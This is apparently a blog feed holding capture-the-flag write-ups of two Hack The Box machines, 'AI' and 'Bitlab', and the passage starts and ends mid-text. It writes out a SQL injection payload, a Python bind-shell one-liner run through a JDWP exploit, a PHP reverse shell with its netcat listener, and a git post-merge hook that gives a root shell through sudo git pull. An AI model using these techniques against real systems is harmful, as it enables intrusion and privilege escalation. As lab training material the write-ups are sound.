OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
</code></pre><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>
<h2 id="web-enumeration">Web enumeration</h2>
<p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
Some enumeration of it is carried.</p>

    <img src="/images/htb/ai/1.1-web.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-php-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-php-2.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-php-3.png"  class="center"  style="border-radius: 8px;"  />


<p>Is given a try to create a .wav file from text (text -&gt; .mp3 -&gt; .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p>

    <img src="/images/htb/ai/1.1-web-rce-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-rce-2.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="foothold">Foothold</h2>
<p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/07 15:23:07 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/uploads (Status: 301)
/db.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
===============================================================
2020/02/07 15:48:32 Finished
===============================================================
</code></pre><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>

    <img src="/images/htb/ai/2.1-rce-2.png"  class="center"  style="border-radius: 8px;"  />


<p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href="https://www.hackthebox.eu/profile/10423">Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href="https://www.text2speech.org/">Text 2 Speech</a>:</p>

    <img src="/images/htb/ai/t2s.png"  class="center"  style="border-radius: 8px;"  />


<p>getting as final SQL Injection the next:</p>
<pre><code>User:
Open single quote union select, username from users Comment Database
Password:
Open single quote union select, password from users Comment Database
</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p>

    <img src="/images/htb/ai/command-ok-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/command-ok-2.png"  class="center"  style="border-radius: 8px;"  />


<p>Then, was tried to login via ssh with the credentials:</p>
<pre><code>user: alexa
passwd: H,Sq9t6}a&lt;)?q93_
</code></pre><p>Getting a success:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
alexa@10.10.10.163's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  7 20:27:47 UTC 2020

  System load:  0.14               Processes:           162
  Usage of /:   28.0% of 19.56GB   Users logged in:     1
  Memory usage: 27%                IP address for eth0: 10.10.10.163
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
15 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
alexa@AI:~$ wc -c user.txt
33 user.txt
</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
<p>When is checked which net. services are listening, was found :8080:</p>
<pre><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
:Port                 
udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
:*                    
udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
:*                    
tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
</code></pre><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>

    <img src="/images/htb/ai/tomcat-tunnel.png"  class="center"  style="border-radius: 8px;"  />


<p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JDWP</a> enabled:</p>
<pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
</code></pre><p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
<p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/bash</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">])</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
<pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=650
[+] Found Runtime.getRuntime(): id=7f9080006b60
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x6ed
[+] Selected payload '/tmp/bind.sh'
[+] Command string object created id:6ee
[+] Runtime.getRuntime() returned context id:0x6ef
[+] found Runtime.exec(): id=7f9080006b98
[+] Runtime.exec() successful, retId=6f0
[!] Command successfully executed
</code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
ai.lnx.htb [10.10.10.163] 2222 (?) open
bash: cannot set terminal process group (6086): Inappropriate ioctl for device
bash: no job control in this shell
root@AI:~# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
</code></pre><p>Done, we have root access and the root.txt flag :D.</p>
<p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Bitlab</title>
            <link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link>
            <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid>
            <description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description>
            <content type="html"><![CDATA[
    <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="quick-summary">Quick Summary</h2>
<p>First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the <code>sudo + git</code> path as I&rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</p>
<p>This was a cool box, not hard at the technical level, but one that required to enumerate a lot, so pretty cool to get better at that!</p>
<p>Said that, let&rsquo;s get our hands dirty :D</p>
<h2 id="nmap">Nmap</h2>
<p>We start running nmap to get which ports/services are being exposed:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
</code></pre><p>And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is <a href="https://gitlab.com/">Gitlab</a>.</p>
<h2 id="web-enumeration">Web enumeration</h2>
<p>The home page (<code>http://10.10.10.114/</code>), is just the standard login page which bitlab has:</p>

    <img src="/images/htb/bitlab/1.1-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>We try the links in this page and check if they are working, with it we found <code>Help</code> it is, and we are redirected to a directory listing having a <code>bookmarks.html</code> and open it:</p>

    <img src="/images/htb/bitlab/1.2-web_enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/bitlab/1.3-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href="https://lelinhtinh.github.io/de4js/">de4js</a> but any deobfuscation tool or even a python console will do it):</p>
<p>From the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
</code></pre></div><p>We get the following code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> (<span style="color:#66d9ef">function</span> () {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];
    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>];
})()
</code></pre></div><p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p>

    <img src="/images/htb/bitlab/1.5-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>Taking a deepest look into <code>Profile</code> we find that this project has <a href="https://docs.gitlab.com/ee/topics/autodevops/">Auto DevOps</a> enabled.
We continue enumerating a bit more, and see that the project called <code>Deployer</code> is in charge to manage to do that: deploy the applications, in the description is given a link pointing to the we take a look into the documentation of <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">webhooks</a> gitlab has, after it we take a look into <code>index.php</code> to see what it does:</p>

    <img src="/images/htb/bitlab/1.6-web_enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>

$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);

$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;

<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</code></pre></div><p>Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of <code>index.php</code> specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute <code>index.php</code> from <code>Deployer</code> with this we will have our reverse shell uploaded to server.</p>
<h2 id="rce---www-data---root">RCE -&gt; www-data -&gt; root</h2>
<p>We upload the next <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell by pentestmonkey</a> changing <code>$ip = '127.0.0.1'</code> and <code>$port = 1234</code> to our ip and the port we will be listening in our machine, afterwards we merge it (we will be automatically redirected to the page for merging it).</p>
<p>Now, the reverse shell is uploaded, but we still need to execute it, for that is needed to know which one is the path to execute it, if we remember the project <code>Deployer</code> has it&rsquo;s index.php which will print an &ldquo;OK&rdquo; we could try to access the path of deployer and see if it is printed, if it is, then we know that the path for our reverse shell will be <code>http://10.0.0.14/profile/&lt;name of our reverse shell&gt;</code>:</p>

    <img src="/images/htb/bitlab/1.rce.png"  class="center"  style="border-radius: 8px;"  />


<p>Now we know that indeed that the mentioned url above will be the one wee need to use.
We run the listener for our reverse shell and execute it, with it having our rce:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
</code></pre><p>We check if we have sudo rights, where is the home of www-data and what we found there:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
</code></pre><p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href="https://git-scm.com/docs/githooks#_post_merge">hooks: post merge</a> and the one for <a href="https://git-scm.com/docs/git-pull">git pull</a>.</p>
<p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
</code></pre><p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
</code></pre><p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -&gt; origin/master
 * [new branch]      patch-2    -&gt; origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
</code></pre><p>With this we can already go to <code>/home</code> and see from there which user and it&rsquo;s respective flag.</p>
<h2 id="beyond-root">Beyond root</h2>
<p>Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>
<p>1 - Intended way (user -&gt; root) by doing reversing.
2 - Taking advantage of this misconfigurations.</p>
<p>I will go now into the 1, but I will only cover how to get user, and in the future once I know some reversing, I will post the last piece.</p>
<h2 id="user">User</h2>
<p>In the home page of the Profile project, there is a hint, is mentioned a connection postgresql and snippets, we go to the snippets page, and we found we have one</p>

    <img src="/images/htb/bitlab/1-intended_user.png"  class="center"  style="border-radius: 8px;"  />


<p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
</code></pre></div><p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
<span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
<span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">$arr</span>);
</code></pre></div><p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>
